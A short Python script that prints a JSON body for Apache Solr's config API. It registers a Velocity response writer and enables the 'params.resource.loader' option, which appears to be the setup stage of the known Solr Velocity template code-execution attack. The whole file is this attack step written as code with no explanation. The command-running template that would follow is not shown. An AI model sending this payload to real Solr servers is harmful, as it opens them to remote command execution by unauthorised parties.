import json

payload = {
        'update-queryresponsewriter': {
            'startup': 'lazy',
            'name': 'velocity',
            'class': 'solr.VelocityResponseWriter',
            'template.base.dir': '',
            'solr.resource.loader.enabled': 'true',
            'params.resource.loader.enabled': 'true'
            }
        }
print(json.dumps(payload))
